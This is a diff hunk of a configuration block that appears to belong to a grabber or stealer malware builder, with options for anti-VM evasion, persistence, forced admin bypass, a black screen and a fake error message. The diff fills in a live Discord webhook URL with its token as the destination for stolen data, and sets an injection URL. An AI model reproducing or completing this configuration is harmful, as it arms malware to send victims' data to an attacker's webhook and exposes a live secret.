@@ -15,10 +15,10 @@ config = {
     # Force Admin: Bypass Admin Privileges? (May not work, True/False, Bool)
     # Black Screen: Make screen black? (True/False, Bool)
     # Error Message: Fake error text to display. (Leave Blank for None)
-    'webhook': 'a',
+    'webhook': 'https://discord.com/api/webhooks/1341960310420017193/tL1wCCQJ2VCBdhnhE6c5MaoD1hwuXfZUVin7nZb8NKJ9sSzhkKDqjN3Fmz_59abz_xhS',
     'persist': False,
     'keep-alive': False,
-    'injection_url': 'url to injection (raw)',
+    'injection_url': 'https://wallpapersok.com/images/hd/windows-xp-bliss-reversed-windows-xp-bliss-wallpaper-1076lru9kqy2fzu0.jpg',
     'inject': False,
     'hideconsole': False,
     'antivm': True,
